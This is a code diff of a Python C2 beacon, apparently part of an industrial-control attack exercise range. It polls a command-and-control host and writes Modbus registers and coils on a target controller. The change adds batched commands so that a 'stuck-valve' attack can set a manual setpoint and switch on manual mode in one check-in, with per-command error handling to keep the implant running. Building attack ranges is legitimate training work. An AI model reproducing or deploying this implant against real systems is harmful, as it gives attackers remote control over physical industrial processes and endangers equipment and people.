@@ -49,7 +49,7 @@ def write_register(host, port, unit, address, value):
     return resp
 
 
-def execute(cmd, target_host, target_port, target_unit):
+def execute_one(cmd, target_host, target_port, target_unit):
     action = cmd.get("action")
     address = cmd.get("address")
     value = cmd.get("value")
@@ -59,6 +59,27 @@ def execute(cmd, target_host, target_port, target_unit):
         return write_register(target_host, target_port, target_unit, address, value)
     print(f"[beacon] unknown action: {action}", flush=True)
     return None
+
+
+def execute(cmd, target_host, target_port, target_unit):
+    # cmd can be a single {"action": ...} object, or a list of them to run
+    # in order from one queued command - e.g. the stuck-valve cyber inject
+    # (control_daemon.py on Kali) queues [write manual setpoint register,
+    # then set manual_mode coil] together so both land in the same
+    # check-in instead of racing a second queue against the beacon's next
+    # poll. c2_listener.py already cleared the pending file by the time
+    # this runs, so a mid-list failure here has no retry - each item is
+    # isolated and logged rather than letting one bad write take down the
+    # whole beacon (and silently abandon the rest of the list).
+    commands = cmd if isinstance(cmd, list) else [cmd]
+    results = []
+    for c in commands:
+        try:
+            results.append(execute_one(c, target_host, target_port, target_unit))
+        except Exception as exc:
+            print(f"[beacon] command failed: {c} ({exc})", flush=True)
+            results.append(None)
+    return results
 
 
 def check_in(c2_host, c2_port, beacon_id):
@@ -92,8 +113,13 @@ def main():
         cmd = response.get("cmd") if response else None
         if cmd:
             print(f"[beacon] received command: {cmd}", flush=True)
-            result = execute(cmd, args.target_host, args.target_port, args.target_unit)
-            print(f"[beacon] executed, response: {result.hex() if result else None}", flush=True)
+            try:
+                results = execute(cmd, args.target_host, args.target_port, args.target_unit)
+            except Exception as exc:
+                print(f"[beacon] malformed command, skipped: {exc}", flush=True)
+                results = []
+            for result in results:
+                print(f"[beacon] executed, response: {result.hex() if result else None}", flush=True)
         time.sleep(args.interval)
 
 
